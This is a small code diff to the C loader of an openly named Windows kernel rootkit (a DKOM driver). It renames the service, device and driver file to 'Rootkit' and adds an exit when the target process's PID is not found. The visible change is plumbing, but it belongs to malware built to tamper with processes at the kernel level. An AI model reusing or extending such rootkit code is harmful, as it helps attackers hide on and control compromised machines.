@@ -2,9 +2,9 @@
 #include "loader.h"
 
 
-#define SERVICE "rootkit"
-#define DEVICE "\\\\.\\rootkit"
-#define DRIVER "c:\\\\Windows\\System32\\drivers\\KMDF_DKOM.sys"
+#define SERVICE "Rootkit"
+#define DEVICE "\\\\.\\Rootkit"
+#define DRIVER "c:\\\\Windows\\System32\\drivers\\Rootkit.sys"
 
 
 
@@ -164,6 +164,12 @@ int main(int argc, char *argv[])
 
     // Get the PID of the given process
     unsigned int pid = FindProcessId(argv[1]);
+
+    // Exit if PID not found
+    if (pid == 0) {
+        exit(2);
+    }
+
 
     printf("\n[+] Discovered PID of process %s: %d\n", argv[1], pid);
 
